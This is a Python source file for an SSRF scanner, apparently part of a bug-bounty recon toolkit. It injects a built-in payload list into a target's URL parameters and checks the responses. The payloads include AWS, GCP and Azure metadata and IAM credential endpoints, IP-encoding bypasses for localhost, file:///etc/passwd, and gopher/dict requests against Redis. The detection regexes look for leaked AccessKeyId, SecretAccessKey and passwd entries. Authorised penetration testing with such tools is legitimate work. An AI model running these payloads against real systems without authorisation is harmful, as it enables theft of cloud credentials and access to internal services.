"""SSRF Scanner - tests URL parameters for SSRF vulnerabilities."""

import asyncio
import json
import re
import time
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from pathlib import Path

import click
from colorama import Fore, Style

from core.config import Config
from core.http_client import AsyncHTTPClient


class SSRFScanner:
    """Scanner for Server-Side Request Forgery vulnerabilities."""

    def __init__(self, target: str, config: Config, proxy: Optional[str] = None,
                 callback_url: Optional[str] = None, threads: int = 10):
        self.target = target
        self.config = config
        self.proxy = proxy
        self.callback_url = callback_url
        self.threads = threads
        self.results: List[Dict[str, Any]] = []
        self.logger = logging.getLogger("bugrecon.tools.ssrf")

        if proxy:
            self.config._data.setdefault("proxy", {})["enabled"] = True
            self.config._data["proxy"]["http_proxy"] = proxy

    def get_payloads(self, wordlist: Optional[str] = None) -> List[Dict[str, str]]:
        """Get SSRF test payloads."""
        payloads = [
            # Cloud metadata
            {"value": "http://169.254.169.254/latest/meta-data/", "type": "aws-metadata"},
            {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "type": "aws-creds"},
            {"value": "http://metadata.google.internal/computeMetadata/v1/", "type": "gcp-metadata"},
            {"value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "type": "azure-metadata"},
            # Localhost variants
            {"value": "http://127.0.0.1/", "type": "localhost"},
            {"value": "http://localhost/", "type": "localhost"},
            {"value": "http://0.0.0.0/", "type": "localhost"},
            {"value": "http://[::1]/", "type": "ipv6-localhost"},
            # IP bypass formats
            {"value": "http://2130706433/", "type": "decimal-ip"},
            {"value": "http://0x7f000001/", "type": "hex-ip"},
            {"value": "http://0177.0.0.1/", "type": "octal-ip"},
            {"value": "http://127.1/", "type": "short-ip"},
            {"value": "http://0/", "type": "zero-ip"},
            # Protocol smuggling
            {"value": "file:///etc/passwd", "type": "file-proto"},
            {"value": "file:///c:/windows/win.ini", "type": "file-proto-win"},
            {"value": "gopher://127.0.0.1:6379/_INFO", "type": "gopher-redis"},
            {"value": "dict://127.0.0.1:6379/INFO", "type": "dict-redis"},
            # DNS rebinding
            {"value": "http://spoofed.burpcollaborator.net/", "type": "oob"},
            {"value": "http://0177.0.0.1.nip.io/", "type": "dns-bypass"},
            # Internal networks
            {"value": "http://10.0.0.1/", "type": "internal"},
            {"value": "http://172.16.0.1/", "type": "internal"},
            {"value": "http://192.168.1.1/", "type": "internal"},
        ]

        # Add callback-based payloads
        if self.callback_url:
            payloads.append({"value": self.callback_url, "type": "oob-callback"})

        # Load custom wordlist
        if wordlist and Path(wordlist).exists():
            with open(wordlist) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append({"value": line, "type": "custom"})

        return payloads

    async def scan(self, wordlist: Optional[str] = None) -> List[Dict[str, Any]]:
        """Run SSRF scan against target."""
        payloads = self.get_payloads(wordlist)
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            # If no params in URL, test common SSRF parameter names
            ssrf_params = ["url", "uri", "path", "dest", "redirect", "callback",
                          "next", "target", "rurl", "link", "image", "fetch",
                          "proxy", "src", "href", "load"]
            params = {p: ["test"] for p in ssrf_params}

        self.logger.info(f"Testing {len(params)} parameters with {len(payloads)} payloads")

        async with AsyncHTTPClient(self.config) as client:
            # Get baseline response
            baseline = await self._get_baseline(client)

            # Test each parameter with each payload
            semaphore = asyncio.Semaphore(self.threads)
            tasks = []

            for param_name in params:
                for payload in payloads:
                    tasks.append(
                        self._test_payload(client, semaphore, param_name, payload, baseline)
                    )

            await asyncio.gather(*tasks)

        return self.results

    async def _get_baseline(self, client: AsyncHTTPClient) -> Dict[str, Any]:
        """Get baseline response for comparison."""
        try:
            resp = await client.get(self.target)
            return {
                "status": resp.status,
                "length": len(resp.text),
                "time": resp.elapsed,
            }
        except Exception:
            return {"status": 0, "length": 0, "time": 0}

    async def _test_payload(self, client: AsyncHTTPClient, semaphore: asyncio.Semaphore,
                           param: str, payload: Dict[str, str], baseline: Dict[str, Any]):
        """Test a single parameter with a single payload."""
        async with semaphore:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            params[param] = [payload["value"]]

            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                start = time.time()
                resp = await client.get(test_url, timeout=15)
                elapsed = time.time() - start

                # Check for SSRF indicators
                finding = self._analyze_response(resp, payload, param, baseline, elapsed)
                if finding:
                    self.results.append(finding)
                    self._print_finding(finding)

            except Exception as e:
                self.logger.debug(f"Error testing {param}={payload['value']}: {e}")

    def _analyze_response(self, resp, payload: Dict, param: str,
                         baseline: Dict, elapsed: float) -> Optional[Dict[str, Any]]:
        """Analyze response for SSRF indicators."""
        indicators = []
        confidence = "low"

        # Check for cloud metadata indicators
        metadata_patterns = [
            r'ami-[a-f0-9]+', r'instance-id', r'security-credentials',
            r'iam/', r'AccessKeyId', r'SecretAccessKey',
            r'computeMetadata', r'google', r'azure',
        ]
        for pattern in metadata_patterns:
            if re.search(pattern, resp.text, re.I):
                indicators.append(f"Cloud metadata pattern: {pattern}")
                confidence = "high"

        # Check for internal service responses
        internal_patterns = [
            r'<!DOCTYPE html', r'<title>.*(?:admin|internal|dashboard)',
            r'phpinfo\(\)', r'root:.*:0:0', r'\[extensions\]',
        ]
        for pattern in internal_patterns:
            if re.search(pattern, resp.text, re.I):
                indicators.append(f"Internal service pattern: {pattern}")
                confidence = "high"

        # Check response differences from baseline
        length_diff = abs(len(resp.text) - baseline.get("length", 0))
        if length_diff > 100 and resp.status == 200:
            indicators.append(f"Response length difference: {length_diff}")
            if confidence == "low":
                confidence = "medium"

        # Different status code
        if resp.status != baseline.get("status", 200) and resp.status in [200, 301, 302]:
            indicators.append(f"Status code change: {baseline.get('status')} -> {resp.status}")
            if confidence == "low":
                confidence = "medium"

        # Time-based detection
        if elapsed > baseline.get("time", 0) + 3:
            indicators.append(f"Significant time delay: {elapsed:.2f}s")

        if indicators:
            return {
                "type": "SSRF",
                "parameter": param,
                "payload": payload["value"],
                "payload_type": payload["type"],
                "confidence": confidence,
                "indicators": indicators,
                "response_status": resp.status,
                "response_length": len(resp.text),
                "elapsed": elapsed,
            }
        return None

    def _print_finding(self, finding: Dict[str, Any]):
        """Print a finding to console."""
        color = Fore.RED if finding["confidence"] == "high" else Fore.YELLOW
        print(f"\n{color}[SSRF] [{finding['confidence'].upper()}]{Style.RESET_ALL}")
        print(f"  Parameter: {finding['parameter']}")
        print(f"  Payload: {finding['payload']}")
        print(f"  Type: {finding['payload_type']}")
        for ind in finding["indicators"]:
            print(f"  {Fore.CYAN}→ {ind}{Style.RESET_ALL}")


@click.command()
@click.option('--target', '-t', required=True, help='Target URL with parameters')
@click.option('--proxy', '-p', help='Proxy URL (http://host:port)')
@click.option('--callback', '-c', help='OOB callback URL for blind SSRF')
@click.option('--threads', default=10, help='Number of concurrent threads')
@click.option('--wordlist', '-w', help='Custom payload wordlist')
@click.option('--output', '-o', default='ssrf_results.json', help='Output file')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
def scan(target, proxy, callback, threads, wordlist, output, verbose):
    """SSRF Scanner - Test for Server-Side Request Forgery."""
    from core.utils import print_banner, setup_logging

    print_banner()
    print(f"{Fore.CYAN}[*] SSRF Scanner{Style.RESET_ALL}")
    print(f"[*] Target: {target}")
    print(f"[*] Threads: {threads}")
    if proxy:
        print(f"[*] Proxy: {proxy}")
    print()

    level = "DEBUG" if verbose else "INFO"
    setup_logging(level)
    config = Config()

    scanner = SSRFScanner(target, config, proxy=proxy, callback_url=callback, threads=threads)
    results = asyncio.run(scanner.scan(wordlist))

    # Summary
    print(f"\n{'='*60}")
    print(f"{Fore.GREEN}[*] Scan Complete{Style.RESET_ALL}")
    print(f"[*] Total Findings: {len(results)}")
    high = sum(1 for r in results if r['confidence'] == 'high')
    med = sum(1 for r in results if r['confidence'] == 'medium')
    print(f"[*] High: {high}, Medium: {med}, Low: {len(results) - high - med}")

    # Save results
    with open(output, 'w') as f:
        json.dump({"target": target, "findings": results}, f, indent=2)
    print(f"[*] Results saved to: {output}")


if __name__ == '__main__':
    scan()
